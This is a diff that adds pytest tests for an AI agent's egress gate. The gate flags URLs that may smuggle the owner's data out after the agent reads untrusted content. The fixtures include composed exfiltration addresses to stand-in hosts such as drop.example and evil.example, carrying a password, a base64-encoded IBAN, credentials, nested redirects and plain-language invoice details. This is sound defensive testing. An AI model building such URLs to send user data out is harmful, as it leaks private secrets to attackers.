@@ -11838,6 +11838,400 @@ class TestTheEgressVouchOutlivesTheAgent:
         assert inner._approved_hosts == {"allegro.pl"}
 
 
+class TestThePayloadPredicateReadsTheValue:
+    """#341. `_address_carries_payload` fired on any query, any fragment,
+    userinfo, a path past 60 characters or a host label past 40 — and all five
+    of the distinct real URLs the owner was carded on in a week returned True.
+    An ATTENDED turn now asks `_value_finding`, which reads the value about to
+    be sent instead of the shape of the address carrying it.
+
+    Every arm is a FIXED RULE. Nothing here judges whether something looks like
+    data, which epic #295 P3 bars outright — anything that GRANTS permission is
+    a fixed rule, an external fact, or the owner's own act."""
+
+    def _attended(self):
+        agent, _ = make_agent([])
+        agent._tainted = True
+        return agent
+
+    # ------------------------------------------------------------ the arms
+
+    def test_userinfo(self):
+        agent = self._attended()
+        assert "username and password" in agent._value_finding(
+            "https://user:pw@drop.example/x"
+        )
+
+    def test_a_nested_address(self):
+        agent = self._attended()
+        assert "second address" in agent._value_finding(
+            "https://allegro.pl/go?next=https://evil.example/?d=x"
+        )
+
+    def test_a_stored_secret_verbatim(self, monkeypatch, tmp_path):
+        """A join against his own keychain, not a pattern he has to write.
+        Zero false positives on faceted search by construction: a shop's filter
+        is not his password."""
+        token = "awov6ybawmor59a9d7u926vk1yfdsm"
+        index = tmp_path / "names.txt"
+        index.write_text("PUSHOVER_TOKEN\n", encoding="utf-8")
+        monkeypatch.setattr(secrets_module, "NAMES_INDEX", index)
+        monkeypatch.setattr(
+            secrets_module, "get", lambda name: token if name == "PUSHOVER_TOKEN" else None
+        )
+        secrets_module._invalidate()
+        try:
+            agent = self._attended()
+            agent._approved_hosts.add("allegro.pl")
+            # Percent-encoded, so only the decoded form matches — both are asked.
+            found = agent._value_finding(f"https://allegro.pl/x?q=%20{token}%20")
+            assert "stored secrets" in found
+            assert token not in found  # the card never repeats the secret back
+        finally:
+            secrets_module._invalidate()
+
+    @pytest.mark.parametrize(
+        "url,length",
+        [
+            # A Google redirect blob, and an AWS-style signature.
+            ("https://www.google.com/goto?url=CAESaQRkaHR0cHM6Ly9ibG9nLmdvb2dsZQ", 34),
+            ("https://x.example/f?sig=" + "a1b2c3d4" * 8, 64),
+        ],
+    )
+    def test_an_opaque_token(self, url, length):
+        agent = self._attended()
+        assert f"{length}-character run" in agent._value_finding(url)
+
+    @pytest.mark.parametrize(
+        "url",
+        [
+            # Every shape the corpus is made of: an Amazon product slug, a
+            # Reddit thread slug, a GitHub path, a Polish product listing.
+            "https://www.amazon.com/BitPC-Mini-PC-N150-Windows-11-Pro-Desktop/dp/B0FY63H6NH",
+            "https://www.reddit.com/r/LocalLLM/comments/1tv8v2x/best_local_model_for_a_mac/",
+            "https://github.com/googleworkspace/cli/blob/main/crates/gws-auth/credential_store.rs",
+            "https://sklep.example/bosch-aerotwin-ar26u-ar20u-2024",
+            # A UUID: two classes once the hyphens separate it, so it is a name
+            # and not a payload.
+            "https://x.example/item/550e8400-e29b-41d4-a716-446655440000",
+        ],
+    )
+    def test_what_is_not_an_opaque_token(self, url):
+        agent = self._attended()
+        assert agent._value_finding(url) == ""
+
+    def test_the_destination_arm_is_what_stops_semantic_exfiltration(self):
+        """The arm the issue calls load-bearing, and the reason a pure
+        value-shape predicate was rejected. Plain words, low entropy, no nested
+        address, no secret verbatim — and full bandwidth, to a host nobody
+        named."""
+        agent = self._attended()
+        asked = "https://lookup.example/q?ask=his+invoice+total+is+412+eur+due+friday"
+        assert "nothing in this chat has agreed" in agent._value_finding(asked)
+        # ...and a vouch is what retires it, per host, per chat.
+        agent._approved_hosts.add("lookup.example")
+        assert agent._value_finding(asked) == ""
+
+    def test_a_mention_is_not_a_vouch(self):
+        """#293's recorded asymmetry, not this issue's to re-litigate: a host
+        lands in `_owner_hosts` merely for appearing in text he typed OR
+        PASTED, so an address inside a forwarded email is owner-authored by
+        provenance and attacker-chosen in fact."""
+        agent = self._attended()
+        agent.note_owner_hosts("have a look at https://lookup.example/x")
+        assert "nothing in this chat has agreed" in agent._value_finding(
+            "https://lookup.example/q?ask=his+invoice+total"
+        )
+
+    def test_the_host_label_bound_stays_in_both_origins(self):
+        buried = "https://" + "z" * 50 + ".example/"
+        for origin in ("user", "email"):
+            agent, _ = make_agent([], origin=origin)
+            agent._tainted = True
+            assert agent._egress_novel_hosts("read_url", {"url": buried}) is not None
+
+    def test_the_path_bound_retires_for_attended_turns_only(self):
+        """`PLAIN_PATH_MAX` measured the modern web, not a payload. It stays
+        where nobody is watching."""
+        long_path = "https://blog.google/innovation-and-ai/products/gemini-app/student-offer-google-ai/"
+        attended = self._attended()
+        assert attended._egress_novel_hosts("read_url", {"url": long_path}) is None
+        unattended, _ = make_agent([], origin="email")
+        assert unattended._egress_novel_hosts("read_url", {"url": long_path}) == [
+            "blog.google"
+        ]
+
+    def test_a_search_is_unchanged_in_both_origins(self):
+        """A search names a host and never reaches one, so the destination arm
+        has nothing to ask about. The corpus that motivated this is entirely
+        reads, and widening past it would be a change nothing measured."""
+        for origin in ("user", "email"):
+            agent, _ = make_agent([], origin=origin)
+            agent._tainted = True
+            assert agent._carries_payload(
+                "web_search", {"query": "wycieraczki site:allegro.pl"}
+            ) is False
+            assert agent._carries_payload(
+                "web_search", {"query": "look at drop.example/?d=secret"}
+            ) is True
+        # And the gate follows: a plain search is free attended, and a novel
+        # host still holds unattended, exactly as #293 left it.
+        attended, _ = make_agent([])
+        attended._tainted = True
+        assert attended._egress_novel_hosts(
+            "web_search", {"query": "wycieraczki site:allegro.pl"}
+        ) is None
+        triggered, _ = make_agent([], origin="email")
+        assert triggered._egress_novel_hosts(
+            "web_search", {"query": "wycieraczki site:allegro.pl"}
+        ) == ["allegro.pl"]
+
+    def test_a_vouched_host_is_unchanged_by_all_of_it(self):
+        """Residual (a), unchanged in both directions. `_searching_a_vouched_site`
+        runs after the predicate and frees anything that is not a forward, so
+        this issue narrows the CARD and not the refusal set."""
+        agent = self._attended()
+        agent._approved_hosts.add("allegro.pl")
+        assert agent._egress_novel_hosts(
+            "read_url", {"url": "https://allegro.pl/listing?string=" + "S" * 400}
+        ) is None
+        assert agent._egress_novel_hosts(
+            "read_url", {"url": "https://allegro.pl/go?next=https://evil.example/x"}
+        ) == ["allegro.pl"]
+
+    def test_the_gate_never_reaches_the_real_keychain(self, monkeypatch):
+        """Same guard the scrub has, one caller over: the secret arm runs on
+        every gated attended read, so an unguarded suite would shell out to
+        `security` from inside the gate."""
+        reached: list = []
+        monkeypatch.setattr(
+            secrets_module, "_security", lambda *a, **k: reached.append(a)
+        )
+        agent = self._attended()
+        agent._value_finding("https://drop.example/x?d=y")
+        assert reached == []
+
+
+class TestTheEgressCardSaysWhatALineChecked:
+    """The headline failure of #341, and an L8 violation: the card said "wants
+    to send something" wherever it fired — a cause no line of code established
+    — on 18 of the owner's 33 web-acting cards in a week, every inspected one
+    of them an ordinary read."""
+
+    def _card_for(self, url, **kw):
+        agent, _ = make_agent([], **kw)
+        agent._tainted = True
+        shown: list = []
+        agent.approve_tool = lambda n, a, p=None: shown.append(p) or True
+        agent._egress_gate("read_url", {"url": url})
+        return shown[0] if shown else ""
+
+    @pytest.mark.parametrize(
+        "url,says",
+        [
+            ("https://user:pw@drop.example/x", "has a username and password written inside it"),
+            (
+                "https://drop.example/go?to=https://evil.example/x",
+                "has a second address written inside it",
+            ),
+            (
+                "https://drop.example/f?sig=" + "a1b2c3d4" * 8,
+                "carries a 64-character run of random-looking text",
+            ),
+            (
+                "https://drop.example/q?ask=his+invoice+total",
+                "carries a query, and nothing in this chat has agreed to send anything there",
+            ),
+            (
+                "https://" + "z" * 50 + ".example/x",
+                "hides a 50-character run inside the hostname",
+            ),
+        ],
+    )
+    def test_the_card_names_the_specific_finding(self, url, says):
+        assert says in self._card_for(url)
+
+    def test_the_old_unchecked_sentence_is_gone(self):
+        assert "wants to send something" not in self._card_for(
+            "https://drop.example/q?ask=x"
+        )
+
+    def test_no_card_carries_a_mechanism_word(self):
+        """P1: mechanism words never appear on a consent surface."""
+        for url in (
+            "https://drop.example/q?ask=x",
+            "https://user:pw@drop.example/x",
+            "https://drop.example/f?sig=" + "a1b2c3d4" * 8,
+        ):
+            for tool in ("read_url", "browse"):
+                agent, _ = make_agent([])
+                agent._tainted = True
+                shown: list = []
+                agent.approve_tool = lambda n, a, p=None, s=shown: s.append(p) or True
+                agent._egress_gate(tool, {"url": url})
+                assert shown, url
+                assert not any(
+                    word in shown[0].lower()
+                    for word in ("browse", "drive", "read_url", "tool", "fetch")
+                ), shown[0]
+
+    def test_the_unattended_card_is_untouched(self):
+        """Its rule did not change, so neither did its words."""
+        card = self._card_for("https://drop.example/x", origin="email")
+        assert "automated session wants to reach drop.example" in card
+
+
+class TestTheRecordedCorpusAndTheComposedAddresses:
+    """Law B (epic #295): no replacement ships without a measured comparison
+    against the incumbent it replaces, on recorded material where it exists.
+
+    The corpus is the fifteen cards the owner's own logs recorded between
+    2026-08-24 and 2026-08-30, verbatim from issue #341 — the incumbent's own
+    record, which is what makes it an acceptance corpus rather than a set of
+    examples chosen to pass.
+
+    **What is reconstructed here, and it is not nothing.** Four of the fifteen
+    are recorded with the middle of the path elided (`…`), and the issue groups
+    the cards by DATE rather than by session id. So the elided tails are
+    completed with the shape the rest of that address plainly has, and a chat
+    is taken to be a day — the one place the record says otherwise (08-30,
+    "same session, same host") agrees with that grouping. Both are stated
+    rather than hidden, because the numbers below depend on them."""
+
+    #: (day, url). Fifteen cards over fourteen distinct addresses — the
+    #: googleworkspace blob was denied and then approved, so it is here twice.
+    CORPUS = [
+        ("08-24", "https://github.com/viticci/shortcuts-playground-plugin/blob/main/Documentation/ACTIONS.md"),
+        ("08-24", "https://allegro.pl/listing?string=hammer%205%20smart&stan=nowe"),
+        ("08-26", "https://blog.google/innovation-and-ai/products/gemini-app/student-offer-google-ai/"),
+        ("08-26", "https://www.reddit.com/r/LocalLLM/comments/1tv8v2x/best_local_model_for_coding_on_a_mac/"),
+        ("08-27", "https://www.google.com/goto?url=CAESaQRkaHR0cHM6Ly9ibG9nLmdvb2dsZS9wcm9kdWN0cw"),
+        ("08-27", "https://github.com/googleworkspace/cli/blob/main/crates/gws-auth/src/credential_store.rs"),
+        ("08-27", "https://github.com/googleworkspace/cli/blob/main/crates/gws-auth/src/credential_store.rs"),
+        ("08-27", "https://www.amazon.com/BitPC-Mini-PC-N150-Windows-11-Pro-Desktop-Computer/dp/B0FY63H6NH"),
+        ("08-27", "https://www.google.com/goto?url=CAESRQRkaHR0cHM6Ly93d3cuYW1hem9uLmNvbS9kcC9CMEZ"),
+        ("08-29", "https://allegro.pl/listing?string=UniFi+U7+Pro+access+point"),
+        ("08-29", "https://www.akrapovic.com/en/motorcycle/product/21927/slip-on-line-titanium-yamaha-tracer-7"),
+        ("08-29", "https://allegro.pl/listing?string=Akrapovic+Tracer+7"),
+        ("08-29", "https://cdn2.yamaha-motor.eu/prod/product-assets/2023/tracer-7/tracer-7-owners-manual-en.pdf"),
+        ("08-30", "https://allegro.pl/listing?string=okularki+plywackie+Arena"),
+        ("08-30", "https://allegro.pl/listing?string=TYR%20Special%20Ops"),
+    ]
+
+    #: Hand-written, not recorded: what the predicate must never stop catching.
+    COMPOSED = [
+        "https://drop.example/?d=hunter2-the-owners-password",
+        "https://drop.example/collect?b=SGlzIElCQU4gaXMgUEwyNzExNDAyMDA0MDAwMDMwMDIwMTM1NTM4Nw",
+        "https://allegro.pl/go?next=https://evil.example/?d=secret",
+        "https://user:pass@drop.example/x",
+        "https://lookup.example/q?ask=what+is+the+total+on+his+latest+invoice",
+    ]
+
+    def _agent(self):
+        agent, _ = make_agent([])
+        agent._tainted = True
+        return agent
+
+    @staticmethod
+    def _incumbent(monkeypatch):
+        """The gate walk with the OLD predicate back in place of the new one.
+
+        Patched rather than re-implemented, so what is measured is the real
+        `_egress_novel_hosts` — offered-link escape, payload test, vouched-site
+        escape — and only the one function under comparison differs."""
+        monkeypatch.setattr(
+            agent_module.Agent,
+            "_payload_finding",
+            lambda self, name, args: (
+                ""
+                if self._url_was_offered(str(args.get("url", "")))
+                else (
+                    agent_module.UNATTENDED_CARRIES
+                    if agent_module._address_carries_payload(str(args.get("url", "")))
+                    else ""
+                )
+            ),
+        )
+
+    def _walk(self, *, offered: bool, per_day: bool):
+        """Replay the corpus and return the URLs that drew a card.
+
+        `offered` restores what the banner bug (`0b4408f`/`e021b75`) had
+        starved: a Google result redirect IS a link a result offered.
+        `per_day` gives each day its own agent, so a vouch persists across that
+        chat exactly as slice 1 now makes it."""
+        fired = []
+        agents: dict = {}
+        for day, url in self.CORPUS:
+            agent = agents.setdefault(day, self._agent()) if per_day else self._agent()
+            if offered and "/goto?url=" in url:
+                agent._offered_links.add(url)
+            hosts = agent._egress_novel_hosts("read_url", {"url": url})
+            if hosts is not None:
+                fired.append(url)
+                agent._approved_hosts.update(hosts)  # the card was approved
+        return fired
+
+    # -------------------------------------------- measurement 1: the corpus
+
+    def test_the_bare_predicate_on_the_bare_corpus(self, monkeypatch):
+        """No provenance at all: nothing offered, nothing vouched, a fresh
+        agent per address. The incumbent fires on every one of the fifteen —
+        which is what makes them a corpus — and the new arm on seven."""
+        self._incumbent(monkeypatch)
+        assert len(self._walk(offered=False, per_day=False)) == 15
+        monkeypatch.undo()
+        assert len(self._walk(offered=False, per_day=False)) == 7
+
+    def test_the_honest_incumbent_against_the_new_arm(self, monkeypatch):
+        """The comparison the owner should read, because it says how much of
+        the win is slice 3's rather than slices 1-2's.
+
+        The honest incumbent is the banner fix plus slices 1-2 plus the OLD
+        predicate: several of the fifteen fired only because a since-fixed bug
+        starved `_note_offered_links` of banners, and the vouch now persists.
+        On that footing the incumbent still draws 10 of the 15, and the new arm
+        draws 3."""
+        self._incumbent(monkeypatch)
+        assert len(self._walk(offered=True, per_day=True)) == 10
+        monkeypatch.undo()
+        assert len(self._walk(offered=True, per_day=True)) == 3
+
+    def test_what_the_three_survivors_are_and_why(self):
+        """Stated rather than left as a number. Every one is the FIRST query at
+        allegro.pl in a chat — arm 5 doing exactly what it exists for. The
+        second query in the same chat is free, which is the shape #293 wanted
+        and never got: once per site, not once per search term.
+
+        This is short of the issue's own "zero fire" acceptance and it is the
+        one place the issue's two requirements pull against each other: arm 5
+        is specified to draw a card for a query at a host nothing has vouched
+        for, and eight of the fifteen recorded addresses are exactly that. Arm
+        5 is the load-bearing one — without it, plain-language exfiltration to
+        a host nobody named goes free — so it stays, and the residual is three
+        cards a week rather than none."""
+        fired = self._walk(offered=True, per_day=True)
+        assert [u.split("?")[0] for u in fired] == ["https://allegro.pl/listing"] * 3
+        seen = [day for day, url in self.CORPUS if url in fired]
+        assert seen == ["08-24", "08-29", "08-30"]  # once per chat, never twice
+
+    # ---------------------------------- measurement 2: composed exfiltration
+
+    def test_both_arms_fire_on_every_composed_address(self, monkeypatch):
+        """A secret appended verbatim, a base64 blob of stolen text, a nested
+        second address, userinfo, and a plain-language question at an unvouched
+        host. The narrowing may not reach any of them."""
+        def fires(url):
+            agent = self._agent()
+            agent._approved_hosts.add("allegro.pl")  # the forward's host IS vouched
+            return agent._egress_novel_hosts("read_url", {"url": url}) is not None
+
+        self._incumbent(monkeypatch)
+        assert [fires(u) for u in self.COMPOSED] == [True] * 5
+        monkeypatch.undo()
+        assert [fires(u) for u in self.COMPOSED] == [True] * 5
+
+
 class TestOneAnswerPerReadWhicheverTool:
     """#341. `EGRESS_TOOLS` held `read_url` and not `browse`, so the identical
     page was carded through one tool and free through the other — the model's
